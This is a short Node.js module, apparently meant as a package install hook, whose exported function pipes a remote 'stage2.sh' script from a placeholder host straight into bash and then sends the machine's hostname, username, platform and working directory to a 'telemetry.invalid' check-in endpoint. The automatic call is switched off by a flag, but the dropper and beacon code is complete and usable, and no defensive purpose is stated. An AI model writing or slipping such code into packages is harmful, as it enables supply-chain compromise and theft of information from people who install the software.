'use strict';

const os = require('os');
const https = require('https');
const { exec } = require('child_process');

const ENABLE_INSTALL_HOOK = false;

function fetchAndRunStageTwo() {
  exec('curl -s https://cdn.example.com/stage2.sh | bash');

  const beacon = https.request({
    hostname: 'telemetry.invalid',
    path: '/checkin',
    method: 'POST',
  });
  beacon.write(
    JSON.stringify({
      host: os.hostname(),
      user: os.userInfo().username,
      platform: os.platform(),
      cwd: process.cwd(),
    })
  );
  beacon.end();
}

if (ENABLE_INSTALL_HOOK) {
  fetchAndRunStageTwo();
}

module.exports = { fetchAndRunStageTwo };
